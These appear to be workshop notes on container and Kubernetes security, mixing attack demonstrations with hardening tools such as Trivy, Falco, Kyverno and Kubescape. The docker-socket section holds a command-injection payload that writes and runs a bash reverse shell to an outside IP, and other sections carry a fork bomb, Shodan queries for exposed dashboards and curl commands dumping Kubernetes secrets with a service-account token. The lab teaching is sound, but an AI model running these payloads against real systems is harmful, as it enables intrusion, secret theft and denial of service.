# container-security-workshop-notes

## Agenda

1. Kubernetes misconfiguration attacks
2. Docker attacks, if any
3. Attack surface in comparision to monolithic applications
4. Docker security tips
5. Tools for hardening docker
6. How to secure it? Dockerfile
7. Hardening dockerfiles
8. Resources to Kubernetes tips
9. 

## Rough outline

### Sample attacks & hacks across the globe


Demo of how security hacks are done!
shodan + script (hide) + enumeration + recon + live hacking (scope)



### Live session on how it's done

shodan.io

You can get the pro account for $5 for life time & it's worth it.

Query - port:4040 country:"IN" city:"Mumbai"

You can use their developer guide to write scripts to scrape the data, etc.

https://github.com/JavierOlmedo/shodan-filters

https://github.com/weaveworks/scope

scope launch -app.http.address 0.0.0.0:4040

apk add docker
apk add libcap
capsh --print

You can run privileged containers, containers with hostpid, hostipc, etc. You can gain access to the host machine, run things around, run crypto miners silently in the background, etc.

Or leverage capablities like  CAP_SYS_ADMIN, CAP_SYS_MODULE, CAP_SYS_RAWIO, CAP_NET_ADMIN, 

nsenter to create namespaces in linux

### Container?

https://github.com/rewanthtammana/containers-from-scratch/blob/master/main.go#L32

### What does it mean to be root inside a container?

It's just an isolation within your same system. 

```bash
adduser nonroot
sudo groupadd docker
sudo usermod -aG docker nonroot
```

```bash
docker run --rm -it -v /:/abcd ubuntu bash
touch /abcd/etc/dockeruser
```

```bash
podman run --rm -it -v /:/abcd ubuntu bash
touch /abcd/etc/podmanuser
```

### Privileged container

Let's see if we can change the host file permissions from a privileged container

https://github.com/torvalds/linux/blob/v5.0/Documentation/sysctl/vm.txt#L809

```bash
$ docker run --rm --privileged -it ubuntu bash
# cat /proc/sys/vm/swappiness
60
# echo 10 > /proc/sys/vm/swappiness
$ cat /proc/sys/vm/swappiness
```

These kind of changes to the kernel can create DoS attacks!


How to identify if a container is privileged or normal? There are many ways!

1. Check for mount permissions & masking
    ```bash
    mount | grep 'ro'
    mount  | grep /proc.*tmpfs
    ```
1. Linux capablities
1. Seccomp - Limit the syscalls
    ```bash
    grep Seccomp /proc/1/status
    ```

### Capablities

https://command-not-found.com/capsh
https://man7.org/linux/man-pages/man7/capabilities.7.html
https://www.schutzwerk.com/en/43/posts/linux_container_capabilities/

```bash
capsh --print
```

```bash
grep Cap /proc/self/status
capsh --decode=<decodeBnd>
```

Demonstrating that the processes inside the container inherits it's capabilities

```bash
$ docker run --rm -it ubuntu bash
# sleep 1d
$ ps aux | grep sleep
$ grep Cap /proc/<pid>/status
$ capsh --decode=<value>
```

```bash
$ docker run --rm --privileged -it ubuntu bash
# sleep 1d
$ ps aux | grep sleep
$ grep Cap /proc/<pid>/status
$ capsh --decode=<value>
```

```bash
$ docker run --rm --cap-drop=all -it ubuntu bash
# sleep 1d
$ ps aux | grep sleep
$ grep Cap /proc/<pid>/status
$ capsh --decode=<value>
```

CapEff: The effective capability set represents all capabilities the process is using at the moment.
CapPrm: The permitted set includes all capabilities a process may use.
CapInh: Using the inherited set all capabilities that are allowed to be inherited from a parent process can be specified.
CapBnd: With the bounding set its possible to restrict the capabilities a process may ever receive.
CapAmb: The ambient capability set applies to all non-SUID binaries without file capabilities.

CAP_CHOWN - allows the root use to make arbitrary changes to file UIDs and GIDs
CAP_DAC_OVERRIDE - allows the root user to bypass kernel permission checks on file read, write and execute operations.
CAP_SYS_ADMIN - Most powerful capability. It allows to manage cgroups of the system, thereby allowing you to control system resources

```bash
$ docker run --rm -it ubuntu bash
# ping google.com
```

```bash
$ docker run --rm --cap-drop=NET_RAW -it ubuntu bash
# ping google.com
```

```bash
docker run --rm -it --cap-drop=all ubuntu chown nobody /tmp
docker run --rm -it ubuntu chown nobody /tmp
docker run --rm -it --cap-drop=all --cap-add=chown ubuntu chown nobody /tmp
```

https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/
https://www.schutzwerk.com/en/43/posts/linux_container_capabilities/
https://blog.pentesteracademy.com/abusing-sys-module-capability-to-perform-docker-container-breakout-cf5c29956edd

### Docker socket

We got multiple scenarios in Kubernetes Goat. So, we can do a hands-on session on those scenarios.

https://github.com/madhuakula/kubernetes-goat

```bash
git clone https://github.com/madhuakula/kubernetes-goat.git
cd kubernetes-goat
bash setup-kubernetes-goat.sh
# Wait for a while to get all services up & running
watch -n 0.1 kubectl get po
bash access-kubernetes-goat.sh
```

http://127.0.0.1:1231/

```bash
# Get a reverse shell to ease the enumeration
127.0.0.1;echo "bash -i >& /dev/tcp/18.141.250.7/8888 0>&1" > /tmp/run.sh;cat /tmp/run.sh
# echo "bash -i >& /dev/tcp/18.141.250.7/8888 0>&1" > /tmp/run.sh
127.0.0.1;chmod +x /tmp/run.sh;bash /tmp/run.sh
# look for ambiguiencies in the files
find / -name docker.sock
apt update #But this is taking lots of time for some reason. So, we cannot install docker directly!
# Download docker binary directly to save the time
wget https://download.docker.com/linux/static/stable/x86_64/docker-17.03.0-ce.tgz
tar xvf docker-17.03.0-ce.tgz
cd docker
./docker -H unix:///custom/docker/docker.sock ps
./docker -H unix:///custom/docker/docker.sock images
```

An attacker can replace the existing images with malicious images. The end-user will never get to know & since the image is existing on the local system, the user will use it without any disruption. You can even run privileged containers, mount host system, change the file system, kernel files, & lot more.

https://highon.coffee/blog/reverse-shell-cheat-sheet/

docker-socket recon

https://github.com/search?q=%2Fvar%2Frun%2Fdocker.sock+filename%3Adocker-compose.yml+language%3AYAML+language%3AYAML&type=Code&ref=advsearch&l=YAML&l=YAML

One of the results -> https://github.com/domwood/kiwi-kafka/blob/f47f91f5611f2c18694764d812d110b62126c694/scripts/docker-compose-kiwi.yml

docker-compose up


### hostPid

You will have able to access processes running on the host machine. So, you will get access to lots of privileged information.

### hostIpc

Not very dangerous but if any process uses the IPC (Inter Process Communication) on the host/any other container, you can write to those devices! Usually IPC shared memory is in /dev/shm

### hostNetwork

The container will be using the network interface same as host machine. No special IP allocation or something. Since, you have access to the main network interface, you can dump/intercept traffic ;)

### Trivy docker images

https://github.com/aquasecurity/trivy

Visit the latest releases section & install the binary!

```bash
trivy i nginx
```

Since, you have learnt argocd. I will teach you how to fix issues in argocd!

```bash
git clone https://github.com/argoproj/argo-cd
# Some error due to BUILDPLATFORM, so just remove it!
docker build . -t argocd
trivy i argocd
```

It will take sometime to build, so let's review multi-stage builds for a while.

https://docs.docker.com/develop/develop-images/multistage-build/

```bash
trivy i ubuntu:22.10
trivy i ubuntu:21.10
trivy i ubuntu:21.04
```

Change the base image in the dockerfile, rebuild the argocd image & then scan it. Most of the issues will be sorted out!

Distroless images

https://github.com/GoogleContainerTools/distroless

```bash
trivy i gcr.io/distroless/static-debian11
```

```bash
docker run --rm -it gcr.io/distroless/static-debian11 sh
docker run --rm -it gcr.io/distroless/static-debian11 ls
docker run --rm -it gcr.io/distroless/static-debian11 id
docker run --rm -it gcr.io/distroless/static-debian11 whoami
```

### Analyzing docker images

```bash
docker pull ubuntu
docker inspect ubuntu
```

But the above inspect command will not help you to examine the layers of the docker images

https://github.com/wagoodman/dive

```bash
wget https://github.com/wagoodman/dive/releases/download/v0.9.2/dive_0.9.2_linux_amd64.deb
sudo apt install ./dive_0.9.2_linux_amd64.deb
```

https://github.com/madhuakula/kubernetes-goat

```bash
git clone https://github.com/madhuakula/kubernetes-goat.git
cd kubernetes-goat
bash setup-kubernetes-goat.sh
# Wait for a while to get all services up & running
watch -n 0.1 kubectl get po
bash access-kubernetes-goat.sh
```

```bash
kubectl get jobs
kubectl get jobs hidden-in-layers -oyaml
docker save madhuakula/k8s-goat-hidden-in-layers -o hidden-in-layers.tar
tar -xvf hidden-in-layers.tar
# Find the ID
# Identify the ID
cd <ID>
tar -xvf layers.tar
cat <whatever-it-is>
```

### DoSing the container - Fork bomb

**DO NOT RUN IN ON YOUR COMPUTER EVER**

```bash
:(){ :|:& };:
```

We will do this on killercoda! Get ready to crash your system.

```bash
docker run --name nolimits --rm -it ubuntu bash
docker stats nolimits
```

```bash
docker run --name withlimits --rm -m 1Gi --cpus 0.8 -it ubuntu bash
docker stats withlimits
```

### Private registry

You can use tools like dirbuster/gobuster to brute force the list of pages

https://docs.docker.com/registry/spec/api/

```bash
URL="whatever"
curl $URL/v2/
# List all repositories
curl $URL/v2/_catalog
# Get manifest of specific image
curl $URL/v2/madhuakula/k8s-goat-users-repo/manifests/latest
# Try to look for sensitive information in the results
curl $URL/v2/madhuakula/k8s-goat-users-repo/manifests/latest | grep -i env
```

### Dockle

https://github.com/goodwithtech/dockle

Installation

```bash
VERSION=$(
 curl --silent "https://api.github.com/repos/goodwithtech/dockle/releases/latest" | \
 grep '"tag_name":' | \
 sed -E 's/.*"v([^"]+)".*/\1/' \
) && curl -L -o dockle.deb https://github.com/goodwithtech/dockle/releases/download/v${VERSION}/dockle_${VERSION}_Linux-64bit.deb
sudo dpkg -i dockle.deb && rm dockle.deb
```

```bash
dockle madhuakula/k8s-goat-users-repo
```

### NIST framework for containers

https://nvlpubs.nist.gov/nistpubs/specialpublications/nist.sp.800-190.pdf

## Kubernetes 

### RBAC misconfiguration

Kubernetes Goat -  http://127.0.0.1:1236

```bash
cd /var/run/secrets/kubernetes.io/serviceaccount/
ls -larth
export APISERVER=https://${KUBERNETES_SERVICE_HOST}
export SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount
export NAMESPACE=$(cat ${SERVICEACCOUNT}/namespace)
export TOKEN=$(cat ${SERVICEACCOUNT}/token)
export CACERT=${SERVICEACCOUNT}/ca.crt
curl --cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" -X GET ${APISERVER}/api
curl --cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" -X GET ${APISERVER}/api/v1/secrets
curl --cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" -X GET ${APISERVER}/api/v1/namespaces/${NAMESPACE}/secrets
curl --cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" -X GET ${APISERVER}/api/v1/namespaces/${NAMESPACE}/pods
curl --cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" -X GET ${APISERVER}/api/v1/namespaces/${NAMESPACE}/secrets | grep -i key
```

Do not mount the serviceaccount token wherever necessary

```bash
kubectl explain po --recursive | grep -i automount
```

With this method, it's hard to understand the positioning of the field, `automountServiceAccountToken`. I created a tool to ease the process, you can try to leverage it.

Install krew first. https://krew.sigs.k8s.io/docs/user-guide/setup/install/

```bash
(
  set -x; cd "$(mktemp -d)" &&
  OS="$(uname | tr '[:upper:]' '[:lower:]')" &&
  ARCH="$(uname -m | sed -e 's/x86_64/amd64/' -e 's/\(arm\)\(64\)\?.*/\1\2/' -e 's/aarch64$/arm64/')" &&
  KREW="krew-${OS}_${ARCH}" &&
  curl -fsSLO "https://github.com/kubernetes-sigs/krew/releases/latest/download/${KREW}.tar.gz" &&
  tar zxvf "${KREW}.tar.gz" &&
  ./"${KREW}" install krew
)
echo PATH="${KREW_ROOT:-$HOME/.krew}/bin:$PATH" >> ~/.bashrc
source ~/.bashrc
kubectl krew
```

https://github.com/rewanthtammana/kubectl-fields

```bash
kubectl krew install fields
```

```bash
kubectl fields pods automount
```

### Network Policies

https://github.com/ahmetb/kubernetes-network-policy-recipes

Show your presentation on compromising organizational security bug! A detailed presentation on million dollar company hack!

https://www.linkedin.com/posts/rewanthtammana_compromising-organizational-systems-through-activity-6931329299434061824-yMcb

If the database connection to the end-user is blocked, then the attack would have never happened.

### Runtime security

Falco

https://github.com/falcosecurity/falco

Install helm & falco

```bash
wget https://get.helm.sh/helm-v3.9.2-linux-amd64.tar.gz
tar xvf helm-v3.9.2-linux-amd64.tar.gz
sudo mv linux-amd64/helm /usr/local/bin
helm repo add falcosecurity https://falcosecurity.github.io/charts
helm repo update
helm install falco falcosecurity/falco
watch -n 0.1 kubectl get po
kubectl logs -f -l app.kubernetes.io/instance=falco
```

```bash
kubectl run nginx --image nginx
kubectl exec -it nginx bash
```


https://github.com/developer-guy/awesome-falco

### Kyverno

Demonstrate on how you can control the deployment configuration

Install Kyverno,

```bash
kubectl create -f https://raw.githubusercontent.com/kyverno/kyverno/main/config/install.yaml
```

```bash
echo '''apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: require-app-label
spec:
  validationFailureAction: enforce
  rules:
  - name: check-for-app-label
    match:
      resources:
        kinds:
        - Pod
    validate:
      message: "label `app` is required"
      pattern:
        metadata:
          labels:
            app: "?*"''' > check-labels.yaml
```

```bash
kubectl apply -f check-labels.yaml
```

```bash
kubectl run nginx --image nginx
kubectl run nginx --image nginx --labels rand=wer
kubectl run nginx --image nginx --labels app=wer
```

### Kubescape

https://github.com/armosec/kubescape

```bash
wget https://github.com/armosec/kubescape/releases/download/v2.0.164/kubescape-ubuntu-latest
sudo mv kubescape-ubuntu-latest kubescape
```

```bash
kubescape scan
kubescape scan framework nsa
kubescape scan framework nsa -v
```
